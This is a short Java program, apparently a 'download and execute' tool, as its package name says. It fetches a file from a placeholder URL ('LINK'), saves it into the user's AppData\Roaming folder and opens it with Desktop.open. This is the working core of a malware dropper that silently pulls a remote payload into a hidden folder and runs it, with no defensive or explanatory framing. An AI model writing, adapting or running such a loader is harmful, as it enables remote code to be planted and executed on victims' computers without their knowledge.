package de.pascal25565.downloadandexe;

import java.awt.*;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;

public class DandE
{
    public static void main(String[] args)
    {
        Download("LINK");
    }

    static BufferedInputStream in = null;
    static FileOutputStream fout = null;
    static String filename = "Text.txt";

    public static void Download(String link)
    {
        try
        {
            in = new BufferedInputStream(new URL(link).openStream());
            fout = new FileOutputStream("C://Users//" + System.getProperty("user.name") + "//AppData//Roaming//" + filename);
            final byte data[] = new byte[1024];
            int count;
            while ((count = in.read(data, 0, 1024)) != -1)
            {
                fout.write(data, 0, count);
            }
            System.out.println("Downloaded.");
            in.close();
            fout.close();
        } catch (Exception e)
        {
            System.out.println(e);
        }
        try
        {
            Execute();
        } catch (Exception e)
        {
            System.out.println(e);
        }
    }

    public static void Execute() throws Exception
    {
        File f = new File("C://Users//" + System.getProperty("user.name") + "//AppData//Roaming//" + filename);
        Desktop.getDesktop().open(f);
    }
}
